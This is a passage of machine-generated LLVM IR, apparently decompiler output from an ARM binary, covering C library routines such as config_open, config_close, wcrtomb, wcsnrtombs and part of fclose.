  uselistorder i32 %v1_29b64, { 2, 0, 1 }
  uselistorder i32* %r3.global-to-local, { 6, 1, 2, 3, 4, 5, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 0 }
  uselistorder i32* %r2.global-to-local, { 2, 8, 3, 4, 5, 6, 7, 1, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 0 }
  uselistorder i32* %r0.global-to-local, { 1, 2, 3, 4, 5, 7, 6, 8, 11, 12, 10, 9, 14, 13, 16, 15, 17, 18, 21, 19, 20, 25, 22, 23, 24, 28, 26, 27, 0 }
  uselistorder i1* %cpsr_z.global-to-local, { 1, 2, 12, 13, 14, 3, 4, 5, 6, 7, 8, 9, 10, 11, 0, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32 }
  uselistorder i32 81, { 0, 2, 1 }
  uselistorder i32 %arg3, { 3, 4, 2, 0, 1, 5, 6 }
  uselistorder i32 %arg2, { 0, 2, 1 }
  uselistorder label %dec_label_pc_29e60, { 2, 0, 1 }
  uselistorder label %dec_label_pc_29e48, { 2, 0, 1, 3 }
  uselistorder label %dec_label_pc_29e38, { 1, 0 }
  uselistorder label %dec_label_pc_29e28, { 1, 0 }
  uselistorder label %bb71, { 2, 1, 0 }
  uselistorder label %dec_label_pc_29ddc, { 1, 0 }
  uselistorder label %dec_label_pc_29bac.backedge, { 2, 1, 0 }
  uselistorder label %dec_label_pc_29d3c, { 1, 0 }
  uselistorder label %dec_label_pc_29d14, { 1, 0 }
  uselistorder label %dec_label_pc_29d08, { 0, 2, 1 }
  uselistorder label %dec_label_pc_29ccc, { 1, 0 }
  uselistorder label %dec_label_pc_29c00, { 1, 0 }
  uselistorder label %.thread, { 1, 0 }
  uselistorder label %bb64, { 1, 0 }
}

define i32 @__GI_config_close(i32* %arg1) local_unnamed_addr {
entry:
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %tmp, i32* @r4, align 4
  %v2_29e74 = icmp eq i32* %arg1, null
  br i1 %v2_29e74, label %dec_label_pc_29e9c, label %dec_label_pc_29e7c

dec_label_pc_29e7c:                               ; preds = %entry
  %v2_29e7c = load i32, i32* %arg1, align 4
  %v1_29e80 = inttoptr i32 %v2_29e7c to i16*
  %v2_29e80 = call i32 @__GI_fclose(i16* %v1_29e80)
  %v0_29e84 = load i32, i32* @r4, align 4
  %v1_29e84 = add i32 %v0_29e84, 20
  %v2_29e84 = inttoptr i32 %v1_29e84 to i32*
  %v3_29e84 = load i32, i32* %v2_29e84, align 4
  %v2_29e88 = icmp eq i32 %v3_29e84, 0
  br i1 %v2_29e88, label %bb6, label %bb

bb:                                               ; preds = %dec_label_pc_29e7c
  br label %bb6

bb6:                                              ; preds = %dec_label_pc_29e7c, %bb
  store i32 171668, i32* @lr, align 4
  %v1_29e90 = xor i1 %v2_29e88, true
  call void @__pseudo_cond_branch(i1 %v1_29e90, i32 ptrtoint (i32* @global_var_264e8.3412 to i32))
  %v0_29e94 = load i32, i32* @r4, align 4
  store i32 %v0_29e94, i32* @r0, align 4
  %v0_29e98 = call i32 @free()
  br label %dec_label_pc_29e9c

dec_label_pc_29e9c:                               ; preds = %entry, %bb6
  %v1_29ea0 = phi i32 [ 0, %entry ], [ %v0_29e98, %bb6 ]
  ret i32 %v1_29ea0

; uselistorder directives
  uselistorder label %dec_label_pc_29e9c, { 1, 0 }
  uselistorder label %bb6, { 1, 0 }
}

define i32 @__GI_config_open(i32 %arg1) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_29eb0 = load i32, i32* @r4, align 4
  store i32 %v3_29eb0, i32* %stack_var_-8, align 4
  store i32 add (i32 ptrtoint (i32* @global_var_428d0.3044 to i32), i32 -33252), i32* @r1, align 4
  %v0_29eb8 = load i32, i32* @r0, align 4
  %v2_29eb8 = load i32, i32* @r2, align 4
  %v4_29eb8 = call i32 @__GI_fopen(i32 %v0_29eb8, i32 add (i32 ptrtoint (i32* @global_var_428d0.3044 to i32), i32 -33252), i32 %v2_29eb8, i32 ptrtoint (i32* @global_var_428d0.3044 to i32))
  store i32 %v4_29eb8, i32* %r0.global-to-local, align 4
  store i32 %v4_29eb8, i32* @r4, align 4
  %v2_29ebc = icmp eq i32 %v4_29eb8, 0
  br i1 %v2_29ebc, label %bb, label %dec_label_pc_29ec8

bb:                                               ; preds = %entry
  store i32 0, i32* %r0.global-to-local, align 4
  br label %bb5

dec_label_pc_29ec8:                               ; preds = %entry
  store i32 1, i32* %r0.global-to-local, align 4
  %v2_29ed0 = call i32 @calloc(i32 1, i32 24)
  store i32 %v2_29ed0, i32* %r0.global-to-local, align 4
  %v2_29ed4 = icmp eq i32 %v2_29ed0, 0
  br i1 %v2_29ed4, label %bb5, label %bb4

bb4:                                              ; preds = %dec_label_pc_29ec8
  %v1_29ed8 = load i32, i32* @r4, align 4
  %v3_29ed8 = inttoptr i32 %v2_29ed0 to i32*
  store i32 %v1_29ed8, i32* %v3_29ed8, align 4
  %v1_29ee0.pre = load i32, i32* %r0.global-to-local, align 4
  br label %bb5

bb5:                                              ; preds = %bb, %dec_label_pc_29ec8, %bb4
  %v1_29ee0 = phi i32 [ 0, %bb ], [ 0, %dec_label_pc_29ec8 ], [ %v1_29ee0.pre, %bb4 ]
  %v2_29edc = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_29edc, i32* @r4, align 4
  ret i32 %v1_29ee0

; uselistorder directives
  uselistorder i32* %r0.global-to-local, { 2, 3, 0, 1, 4 }
  uselistorder i32 (i32, i32)* @calloc, { 0, 2, 1 }
  uselistorder i32 add (i32 ptrtoint (i32* @global_var_428d0.3044 to i32), i32 -33252), { 1, 0 }
  uselistorder label %bb5, { 2, 1, 0 }
}

define i32 @__GI_wcrtomb(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %stack_var_-16 = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-32 = alloca i32, align 4
  %v6_29eec = load i32, i32* @lr, align 4
  %v2_29ef0 = icmp eq i32 %arg1, 0
  br i1 %v2_29ef0, label %bb, label %.thread

.thread:                                          ; preds = %entry
  br label %bb11

bb:                                               ; preds = %entry
  %v3_29ef8 = ptrtoint i32* %stack_var_-32 to i32
  br label %bb11

bb11:                                             ; preds = %.thread, %bb
  %v0_29f20 = phi i32 [ %arg2, %.thread ], [ 0, %bb ]
  %v0_29f0c = phi i32 [ %arg1, %.thread ], [ %v3_29ef8, %bb ]
  store i32 %arg3, i32* @r4, align 4
  %v2_29f08 = ptrtoint i32* %stack_var_-12 to i32
  store i32 %v2_29f08, i32* @ip, align 4
  %v2_29f10 = ptrtoint i32* %stack_var_-16 to i32
  store i32 16, i32* @r3, align 4
  store i32 %v2_29f08, i32* %stack_var_-16, align 4
  store i32 %v0_29f20, i32* %stack_var_-12, align 4
  %v5_29f28 = inttoptr i32 %v0_29f0c to i8*
  %v6_29f28 = call i32 @__GI_wcsnrtombs(i8* %v5_29f28, i32 %v2_29f10, i32 1, i32 16, i32 %arg3)
  %v2_29f2c = icmp eq i32 %v6_29f28, 0
  br i1 %v2_29f2c, label %bb12, label %bb13

bb12:                                             ; preds = %bb11
  br label %bb13

bb13:                                             ; preds = %bb11, %bb12
  %v1_29f3c = phi i32 [ %v6_29f28, %bb11 ], [ 1, %bb12 ]
  store i32 %v6_29eec, i32* @lr, align 4
  ret i32 %v1_29f3c

; uselistorder directives
  uselistorder i32 %arg3, { 1, 0 }
  uselistorder label %bb13, { 1, 0 }
  uselistorder label %bb11, { 1, 0 }
}

define i32 @__GI_wcsrtombs(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6) local_unnamed_addr {
entry:
  store i32 %arg1, i32* @r3, align 4
  %v0_29f54 = load i32, i32* @r0, align 4
  %v1_29f54 = load i32, i32* @r1, align 4
  %v5_29f54 = inttoptr i32 %v0_29f54 to i8*
  %v6_29f54 = call i32 @__GI_wcsnrtombs(i8* %v5_29f54, i32 %v1_29f54, i32 -1, i32 %arg1, i32 ptrtoint (i32* @0 to i32))
  ret i32 %v6_29f54

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0 }
}

define i32 @__GI_wcsnrtombs(i8* %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %cpsr_z.global-to-local = alloca i1, align 1
  %lr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %stack_var_-32 = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %v3_29f64 = load i32, i32* @r4, align 4
  store i32 %v3_29f64, i32* %stack_var_-12, align 4
  %v10_29f68 = icmp eq i32 %tmp, %arg2
  store i1 %v10_29f68, i1* %cpsr_z.global-to-local, align 1
  br i1 %v10_29f68, label %dec_label_pc_29f80, label %bb

bb:                                               ; preds = %entry
  %v4_29f6c = icmp eq i8* %arg1, null
  store i1 %v4_29f6c, i1* %cpsr_z.global-to-local, align 1
  store i32 %tmp, i32* %lr.global-to-local, align 4
  br i1 %v4_29f6c, label %dec_label_pc_29f80.thread, label %bb39

dec_label_pc_29f80.thread:                        ; preds = %bb
  %v2_29f70 = ptrtoint i32* %stack_var_-32 to i32
  store i1 true, i1* %cpsr_z.global-to-local, align 1
  br label %bb40

bb39:                                             ; preds = %bb
  store i32 1, i32* %r4.global-to-local, align 4
  br label %.thread14.thread

dec_label_pc_29f80:                               ; preds = %entry
  %v2_29f701 = ptrtoint i32* %stack_var_-32 to i32
  store i32 %arg2, i32* %lr.global-to-local, align 4
  %v3_29f80 = icmp eq i8* %arg1, null
  store i1 %v3_29f80, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_29f80, label %bb40, label %.thread8

.thread8:                                         ; preds = %dec_label_pc_29f80
  store i32 %v2_29f701, i32* %lr.global-to-local, align 4
  store i32 0, i32* %r4.global-to-local, align 4
  br label %.thread14.thread

bb40:                                             ; preds = %dec_label_pc_29f80, %dec_label_pc_29f80.thread
  %storemerge20 = phi i32 [ %v2_29f701, %dec_label_pc_29f80 ], [ %v2_29f70, %dec_label_pc_29f80.thread ]
  store i32 %storemerge20, i32* %lr.global-to-local, align 4
  store i32 %tmp, i32* %r4.global-to-local, align 4
  store i32 -1, i32* @r3, align 4
  br label %.thread14.thread

.thread14.thread:                                 ; preds = %bb39, %.thread8, %bb40
  %v2_29fe428 = phi i32 [ %v2_29f701, %.thread8 ], [ %tmp, %bb39 ], [ %storemerge20, %bb40 ]
  %v0_29f98 = load i32, i32* @r3, align 4
  %v3_29f98 = icmp uge i32 %v0_29f98, %arg3
  %arg3.v0_29f98 = select i1 %v3_29f98, i32 %arg3, i32 %v0_29f98
  store i32 %arg3.v0_29f98, i32* %r5.global-to-local, align 4
  %v1_29fa4 = inttoptr i32 %arg2 to i32*
  %v2_29fa4 = load i32, i32* %v1_29fa4, align 4
  store i32 %v2_29fa4, i32* %r2.global-to-local, align 4
  store i32 %arg3.v0_29f98, i32* %r0.global-to-local, align 4
  %v2_29ff822 = icmp eq i32 %arg3.v0_29f98, 0
  store i1 %v2_29ff822, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_29ff822, label %dec_label_pc_2a000, label %dec_label_pc_29fb0

dec_label_pc_29fb0:                               ; preds = %.thread14.thread, %dec_label_pc_29ff0.dec_label_pc_29fb0_crit_edge
  %v2_29fe4 = phi i32 [ %v2_29ff0, %dec_label_pc_29ff0.dec_label_pc_29fb0_crit_edge ], [ %v2_29fe428, %.thread14.thread ]
  %v0_29fbc = phi i32 [ %v0_29fb0.pre, %dec_label_pc_29ff0.dec_label_pc_29fb0_crit_edge ], [ %v2_29fa4, %.thread14.thread ]
  %v1_29fb0 = inttoptr i32 %v0_29fbc to i32*
  %v2_29fb0 = load i32, i32* %v1_29fb0, align 4
  %v7_29fb4 = icmp eq i32 %v2_29fb0, 127
  store i1 %v7_29fb4, i1* %cpsr_z.global-to-local, align 1
  %v1_29fb8 = urem i32 %v2_29fb0, 256
  store i32 %v1_29fb8, i32* @ip, align 4
  %v1_29fbc = add i32 %v0_29fbc, 4
  store i32 %v1_29fbc, i32* %r2.global-to-local, align 4
  %tmp45 = icmp ult i32 %v2_29fb0, 128
  br i1 %tmp45, label %dec_label_pc_29fe0, label %dec_label_pc_29fc4

dec_label_pc_29fc4:                               ; preds = %dec_label_pc_29fb0
  store i32 100704, i32* %r2.global-to-local, align 4
  %v0_29fc8 = call i32 @__aeabi_read_tp()
  store i32 %v0_29fc8, i32* %r0.global-to-local, align 4
  %v3_29fcc = load i16, i16* @global_var_42934.3040, align 2
  %v4_29fcc = sext i16 %v3_29fcc to i32
  store i32 %v4_29fcc, i32* %r2.global-to-local, align 4
  store i32 -1, i32* %r1.global-to-local, align 4
  %v3_29fd8 = add i32 %v4_29fcc, %v0_29fc8
  %v4_29fd8 = inttoptr i32 %v3_29fd8 to i32*
  store i32 84, i32* %v4_29fd8, align 4
  %v0_2a00c.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_2a00c

dec_label_pc_29fe0:                               ; preds = %dec_label_pc_29fb0
  %v2_29fe0 = icmp eq i32 %v1_29fb8, 0
  store i1 %v2_29fe0, i1* %cpsr_z.global-to-local, align 1
  %v1_29fe4 = trunc i32 %v2_29fb0 to i8
  %v3_29fe4 = inttoptr i32 %v2_29fe4 to i8*
  store i8 %v1_29fe4, i8* %v3_29fe4, align 1
  %v0_29fe8 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_29fe8, label %.dec_label_pc_2a000_crit_edge, label %dec_label_pc_29ff0

dec_label_pc_29ff0:                               ; preds = %dec_label_pc_29fe0
  %v0_29ff0 = load i32, i32* %lr.global-to-local, align 4
  %v1_29ff0 = load i32, i32* %r4.global-to-local, align 4
  %v2_29ff0 = add i32 %v1_29ff0, %v0_29ff0
  store i32 %v2_29ff0, i32* %lr.global-to-local, align 4
  %v0_29ff4 = load i32, i32* %r0.global-to-local, align 4
  %v1_29ff4 = add i32 %v0_29ff4, -1
  store i32 %v1_29ff4, i32* %r0.global-to-local, align 4
  %v2_29ff8 = icmp eq i32 %v1_29ff4, 0
  store i1 %v2_29ff8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_29ff8, label %dec_label_pc_2a000, label %dec_label_pc_29ff0.dec_label_pc_29fb0_crit_edge

dec_label_pc_29ff0.dec_label_pc_29fb0_crit_edge:  ; preds = %dec_label_pc_29ff0
  %v0_29fb0.pre = load i32, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_29fb0

.dec_label_pc_2a000_crit_edge:                    ; preds = %dec_label_pc_29fe0
  %v1_29fe8 = load i32, i32* @ip, align 4
  store i32 %v1_29fe8, i32* %r2.global-to-local, align 4
  %v0_2a000.pre = load i32, i32* %lr.global-to-local, align 4
  br label %dec_label_pc_2a000

dec_label_pc_2a000:                               ; preds = %dec_label_pc_29ff0, %.dec_label_pc_2a000_crit_edge, %.thread14.thread
  %v0_2a000 = phi i32 [ %v0_2a000.pre, %.dec_label_pc_2a000_crit_edge ], [ %v2_29fe428, %.thread14.thread ], [ %v2_29ff0, %dec_label_pc_29ff0 ]
  %v1_2a000 = load i32, i32* @sp, align 4
  %v9_2a000 = icmp eq i32 %v0_2a000, %v1_2a000
  store i1 %v9_2a000, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_2a000, label %bb44, label %bb43

bb43:                                             ; preds = %dec_label_pc_2a000
  %v1_2a004 = load i32, i32* %r2.global-to-local, align 4
  store i32 %v1_2a004, i32* %v1_29fa4, align 4
  br label %bb44

bb44:                                             ; preds = %dec_label_pc_2a000, %bb43
  %v0_2a008 = load i32, i32* %r0.global-to-local, align 4
  %v1_2a008 = load i32, i32* %r5.global-to-local, align 4
  %v2_2a008 = sub i32 %v1_2a008, %v0_2a008
  store i32 %v2_2a008, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_2a00c

dec_label_pc_2a00c:                               ; preds = %dec_label_pc_29fc4, %bb44
  %v0_2a00c = phi i32 [ %v0_2a00c.pre, %dec_label_pc_29fc4 ], [ %v2_2a008, %bb44 ]
  store i32 %v0_2a00c, i32* %r0.global-to-local, align 4
  %v2_2a014 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_2a014, i32* %r4.global-to-local, align 4
  ret i32 %v0_2a00c

; uselistorder directives
  uselistorder i32 %v0_2a00c, { 1, 0 }
  uselistorder i32 %v1_29ff4, { 1, 0 }
  uselistorder i32 %v2_29ff0, { 0, 2, 1 }
  uselistorder i32 %v1_29fb8, { 1, 0 }
  uselistorder i32 %v2_29fb0, { 2, 0, 1, 3 }
  uselistorder i32 %v2_29fe428, { 1, 0 }
  uselistorder i32 %v2_29f701, { 2, 1, 0 }
  uselistorder i32* %r4.global-to-local, { 0, 3, 1, 2, 4 }
  uselistorder i32* %r2.global-to-local, { 6, 1, 4, 2, 3, 5, 7, 0 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 0 }
  uselistorder i32* %r0.global-to-local, { 2, 3, 5, 4, 6, 1, 0 }
  uselistorder i32* %lr.global-to-local, { 4, 0, 5, 6, 1, 3, 2 }
  uselistorder i1* %cpsr_z.global-to-local, { 1, 5, 2, 3, 4, 0, 6, 9, 7, 8 }
  uselistorder i32 127, { 3, 0, 2, 1 }
  uselistorder i32 %arg2, { 2, 0, 1, 3 }
  uselistorder label %dec_label_pc_2a00c, { 1, 0 }
  uselistorder label %bb44, { 1, 0 }
  uselistorder label %dec_label_pc_2a000, { 1, 0, 2 }
  uselistorder label %dec_label_pc_29fb0, { 1, 0 }
  uselistorder label %.thread14.thread, { 2, 1, 0 }
}

define i32 @__GI_fclose(i16* %arg1) local_unnamed_addr {
entry:
  %cpsr_c.global-to-local = alloca i1, align 1
  %fp.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i16* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %stack_var_-36 = alloca i32, align 4
  %v3_2a020 = load i32, i32* @r4, align 4
  store i32 %v3_2a020, i32* %stack_var_-36, align 4
  %v6_2a020 = load i32, i32* @r5, align 4
  %v9_2a020 = load i32, i32* @r6, align 4
  %v12_2a020 = load i32, i32* @r7, align 4
  %v15_2a020 = load i32, i32* @r8, align 4
  %v27_2a020 = load i32, i32* @lr, align 4
  %v2_2a024 = add i32 %tmp, 52
  %v3_2a024 = inttoptr i32 %v2_2a024 to i32*
  %v4_2a024 = load i32, i32* %v3_2a024, align 4
  store i32 %v4_2a024, i32* %sb.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_2a02c = icmp eq i32 %v4_2a024, 0
  store i32 %tmp, i32* @r5, align 4
  store i32 ptrtoint (i32* @global_var_428d0.3044 to i32), i32* @r8, align 4
  br i1 %v2_2a02c, label %dec_label_pc_2a040, label %dec_label_pc_2a0a4

dec_label_pc_2a040:                               ; preds = %entry
  %v0_2a040 = call i32 @__aeabi_read_tp()
  store i32 %v0_2a040, i32* %r0.global-to-local, align 4
  %v0_2a044 = load i32, i32* @r5, align 4
  %v1_2a044 = add i32 %v0_2a044, 64
  %v2_2a044 = inttoptr i32 %v1_2a044 to i32*
  %v3_2a044 = load i32, i32* %v2_2a044, align 4
  store i32 %v3_2a044, i32* %r3.global-to-local, align 4
  %v1_2a048 = add i32 %v0_2a040, -1168
  store i32 %v1_2a048, i32* @r6, align 4
  %v3_2a04c = icmp uge i32 %v3_2a044, %v1_2a048
  store i1 %v3_2a04c, i1* %cpsr_c.global-to-local, align 1
  %v9_2a04c = icmp eq i32 %v3_2a044, %v1_2a048
  br i1 %v9_2a04c, label %dec_label_pc_2a098, label %dec_label_pc_2a054

dec_label_pc_2a054:                               ; preds = %dec_label_pc_2a040
  %v1_2a054 = add i32 %v0_2a044, 56
  store i32 %v1_2a054, i32* @r7, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  store i32 %v1_2a054, i32* %r2.global-to-local, align 4
  %v0_2a060 = load i32, i32* %sb.global-to-local, align 4
  store i32 %v0_2a060, i32* @r4, align 4
  %v1_2a064115 = inttoptr i32 %v1_2a054 to i32*
  %v2_2a064116 = load i32, i32* %v1_2a064115, align 4
  store i32 %v2_2a064116, i32* %r3.global-to-local, align 4
  %v3_2a068118 = icmp uge i32 %v2_2a064116, %v0_2a060
  store i1 %v3_2a068118, i1* %cpsr_c.global-to-local, align 1
  %v9_2a068124 = icmp eq i32 %v2_2a064116, %v0_2a060
  br i1 %v9_2a068124, label %dec_label_pc_2a070, label %dec_label_pc_2a088

dec_label_pc_2a070:                               ; preds = %dec_label_pc_2a054, %dec_label_pc_2a070.dec_label_pc_2a064_crit_edge
  %v0_2a070125 = phi i32 [ %v1_2a068.pre, %dec_label_pc_2a070.dec_label_pc_2a064_crit_edge ], [ %v0_2a060, %dec_label_pc_2a054 ]
  store i32 %v0_2a070125, i32* %r0.global-to-local, align 4
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_2a080 = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_2a080, label %dec_label_pc_2a084, label %dec_label_pc_2a070.dec_label_pc_2a064_crit_edge

dec_label_pc_2a070.dec_label_pc_2a064_crit_edge:  ; preds = %dec_label_pc_2a070
  %v0_2a064.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_2a068.pre = load i32, i32* @r4, align 4
  %v1_2a064 = inttoptr i32 %v0_2a064.pre to i32*
  %v2_2a064 = load i32, i32* %v1_2a064, align 4
  store i32 %v2_2a064, i32* %r3.global-to-local, align 4
  %v3_2a068 = icmp uge i32 %v2_2a064, %v1_2a068.pre
  store i1 %v3_2a068, i1* %cpsr_c.global-to-local, align 1
  %v9_2a068 = icmp eq i32 %v2_2a064, %v1_2a068.pre
  br i1 %v9_2a068, label %dec_label_pc_2a070, label %dec_label_pc_2a088

dec_label_pc_2a084:                               ; preds = %dec_label_pc_2a070
  %v0_2a084 = load i32, i32* @r4, align 4
  store i32 %v0_2a084, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_2a088

dec_label_pc_2a088:                               ; preds = %dec_label_pc_2a054, %dec_label_pc_2a070.dec_label_pc_2a064_crit_edge, %dec_label_pc_2a084
  %v0_2a088 = phi i32 [ %v0_2a084, %dec_label_pc_2a084 ], [ %v2_2a064116, %dec_label_pc_2a054 ], [ %v2_2a064, %dec_label_pc_2a070.dec_label_pc_2a064_crit_edge ]
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_2a088 = icmp eq i32 %v0_2a088, 0
  br i1 %v2_2a088, label %bb41, label %bb

bb:                                               ; preds = %dec_label_pc_2a088
  %v1_2a08c = load i32, i32* @r7, align 4
  store i32 %v1_2a08c, i32* %r0.global-to-local, align 4
  br label %bb41

bb41:                                             ; preds = %dec_label_pc_2a088, %bb
  %v1_2a090 = xor i1 %v2_2a088, true
  call void @__pseudo_cond_branch(i1 %v1_2a090, i32 ptrtoint (i32* @global_var_27dec.3092 to i32))
  %v0_2a094 = load i32, i32* @r6, align 4
  %v1_2a094 = load i32, i32* @r5, align 4
  %v2_2a094 = add i32 %v1_2a094, 64
  %v3_2a094 = inttoptr i32 %v2_2a094 to i32*
  store i32 %v0_2a094, i32* %v3_2a094, align 4
  %v0_2a098.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_2a098

dec_label_pc_2a098:                               ; preds = %dec_label_pc_2a040, %bb41
  %v0_2a098 = phi i32 [ %v0_2a044, %dec_label_pc_2a040 ], [ %v0_2a098.pre, %bb41 ]
  %v1_2a098 = add i32 %v0_2a098, 60
  %v2_2a098 = inttoptr i32 %v1_2a098 to i32*
  %v3_2a098 = load i32, i32* %v2_2a098, align 4
  %v1_2a09c = add i32 %v3_2a098, 1
  store i32 %v1_2a09c, i32* %r3.global-to-local, align 4
  store i32 %v1_2a09c, i32* %v2_2a098, align 4
  %v0_2a0a4.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_2a0a4

dec_label_pc_2a0a4:                               ; preds = %entry, %dec_label_pc_2a098
  %v1_2a0ac = phi i32 [ %tmp, %entry ], [ %v0_2a0a4.pre, %dec_label_pc_2a098 ]
  %v1_2a0a4 = inttoptr i32 %v1_2a0ac to i16*
  %v2_2a0a4 = load i16, i16* %v1_2a0a4, align 2
  %v3_2a0a4 = zext i16 %v2_2a0a4 to i32
  store i32 %v3_2a0a4, i32* %r3.global-to-local, align 4
  %v1_2a0a8 = and i32 %v3_2a0a4, 64
  %v2_2a0a8 = icmp eq i32 %v1_2a0a8, 0
  br i1 %v2_2a0a8, label %bb43, label %bb42

bb42:                                             ; preds = %dec_label_pc_2a0a4
  br label %bb43

bb43:                                             ; preds = %dec_label_pc_2a0a4, %bb42
  %storemerge = phi i32 [ %v1_2a0ac, %bb42 ], [ %v1_2a0a8, %dec_label_pc_2a0a4 ]
  store i32 %storemerge, i32* %r0.global-to-local, align 4
  store i32 172212, i32* @lr, align 4
  %v1_2a0b0 = xor i1 %v2_2a0a8, true
  call void @__pseudo_cond_branch(i1 %v1_2a0b0, i32 ptrtoint (i32* @global_var_2b9f8.3418 to i32))
  %v0_2a0b4 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_2a0b4, i32* %fp.global-to-local, align 4
  %v0_2a0b8 = load i32, i32* @r5, align 4
  %v1_2a0b8 = add i32 %v0_2a0b8, 4
  %v2_2a0b8 = inttoptr i32 %v1_2a0b8 to i32*
  %v3_2a0b8 = load i32, i32* %v2_2a0b8, align 4
  store i32 %v3_2a0b8, i32* %r0.global-to-local, align 4
  %v1_2a0bc = call i32 @__GI___libc_close(i32 %v3_2a0b8)
  store i32 %v1_2a0bc, i32* %r0.global-to-local, align 4
  store i32 176, i32* %r3.global-to-local, align 4
  %v0_2a0c4 = load i32, i32* @r8, align 4
  %v2_2a0c4 = add i32 %v0_2a0c4, 176
  %v3_2a0c4 = inttoptr i32 %v2_2a0c4 to i32*
  %v4_2a0c4 = load i32, i32* %v3_2a0c4, align 4
  store i32 %v4_2a0c4, i32* @r7, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v1_2a0c8 = icmp slt i32 %v1_2a0bc, 0
  br i1 %v1_2a0c8, label %bb44, label %bb45

bb44:                                             ; preds = %bb43
  store i32 -1, i32* %fp.global-to-local, align 4
  br label %bb45

bb45:                                             ; preds = %bb43, %bb44
  %v1_2a0d0 = add i32 %v4_2a0c4, 8
  %v2_2a0d0 = inttoptr i32 %v1_2a0d0 to i32*
  %v3_2a0d0 = load i32, i32* %v2_2a0d0, align 4
  store i32 %v3_2a0d0, i32* %r3.global-to-local, align 4
  %v0_2a0d4 = call i32 @__aeabi_read_tp()
  store i32 %v0_2a0d4, i32* %r0.global-to-local, align 4
  %v1_2a0d8 = add i32 %v0_2a0d4, -1168
  store i32 %v1_2a0d8, i32* %sl.global-to-local, align 4
  %v0_2a0dc = load i32, i32* %r3.global-to-local, align 4
  %v3_2a0dc = icmp uge i32 %v0_2a0dc, %v1_2a0d8
  store i1 %v3_2a0dc, i1* %cpsr_c.global-to-local, align 1
  %v9_2a0dc = icmp eq i32 %v0_2a0dc, %v1_2a0d8
  store i32 -1, i32* %r3.global-to-local, align 4
  %v1_2a0e4 = load i32, i32* @r5, align 4
  %v2_2a0e4 = add i32 %v1_2a0e4, 4
  %v3_2a0e4 = inttoptr i32 %v2_2a0e4 to i32*
  store i32 -1, i32* %v3_2a0e4, align 4
  br i1 %v9_2a0dc, label %dec_label_pc_2a12c, label %dec_label_pc_2a0ec

dec_label_pc_2a0ec:                               ; preds = %bb45
  store i32 1, i32* %r1.global-to-local, align 4
  %v0_2a0f0 = load i32, i32* @r7, align 4
  store i32 %v0_2a0f0, i32* %r2.global-to-local, align 4
  store i32 0, i32* @r4, align 4
  %v1_2a0f8108 = inttoptr i32 %v0_2a0f0 to i32*
  %v2_2a0f8109 = load i32, i32* %v1_2a0f8108, align 4
  store i32 %v2_2a0f8109, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v9_2a0fc111 = icmp eq i32 %v2_2a0f8109, 0
  br i1 %v9_2a0fc111, label %dec_label_pc_2a104, label %dec_label_pc_2a11c

dec_label_pc_2a104:                               ; preds = %dec_label_pc_2a0ec, %dec_label_pc_2a104.dec_label_pc_2a0f8_crit_edge
  %v0_2a104112 = phi i32 [ %v1_2a0fc.pre, %dec_label_pc_2a104.dec_label_pc_2a0f8_crit_edge ], [ 0, %dec_label_pc_2a0ec ]
  store i32 %v0_2a104112, i32* %r0.global-to-local, align 4
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_2a114 = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_2a114, label %dec_label_pc_2a118, label %dec_label_pc_2a104.dec_label_pc_2a0f8_crit_edge

dec_label_pc_2a104.dec_label_pc_2a0f8_crit_edge:  ; preds = %dec_label_pc_2a104
